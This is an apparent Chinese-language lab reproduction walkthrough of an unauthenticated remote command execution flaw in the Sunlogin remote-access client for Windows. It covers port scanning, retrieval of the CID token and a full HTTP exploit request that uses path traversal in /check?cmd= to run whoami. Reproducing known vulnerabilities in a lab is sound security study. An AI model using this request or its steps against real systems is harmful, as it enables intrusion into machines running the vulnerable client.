## 前言

向日葵个人版和企业版均受影响 for Windows
<=11.0.0.33SunloginClient启动后会在40000以上随机开放一个web端口，认证有问题可以直接通过cgi-bin/rpc?action=verify-haras获取cid 执行回显rce。

##  **开始复现（以下均为靶场环境）**

 **这里用的是vm虚拟机安装的win10系统。**

1\. 我们先安装漏洞版本的向日葵也就是<=11.0.0.33版本。2.
打开向日葵，连接服务器成功才可以。![](https://image.3001.net/images/20220328/1648449514_624157ea1521735ed4250.png!small)  
3\.
打开之后会自动开启一个端口（40000-60000）之间随机的，我们扫描一下端口（先查看安装向日葵电脑的ip），我们扫出来的ip端口是50038。![](https://image.3001.net/images/20220328/1648449893_62415965a27a1a9f04e58.png!small)![](https://image.3001.net/images/20220328/1648449904_62415970beb931fbed9b1.png!small)  
4\. 验证是否端口可用（也就是是否可以利用漏洞）。执行curl 192.168.236.128:50573（也就是curl
ip:端口）。提示{"success":false,"msg":"Verification
failure"}就是可以利用的。![](https://image.3001.net/images/20220328/1648449934_6241598e6699f14cb57b3.png!small)  
5\. 我们使用EXP（python写的）获取Token
get；这里用的是攻击机（也就是物理机）运行的脚本。![](https://image.3001.net/images/20220328/1648449956_624159a48996a46f648cd.png!small)  
6\. 这里有数据包（EXP）直接拿到BP上面去用就行，注意：我们获取到的Token get替换到数据包最后面CID=后面的内容。

    
    
    GET /check?cmd=ping../../../../../../../../../../../windows/system32/whoami HTTP/1.1
    Host: 192.168.200.209:50915
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
    Accept-Encoding: gzip, deflate
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Connection: close
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0
    Cookie: CID=dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3

这里ip端口要改。![](https://image.3001.net/images/20220328/1648450068_62415a14cd47b1ffe26b7.png!small)  
这样就执行命令成功了！

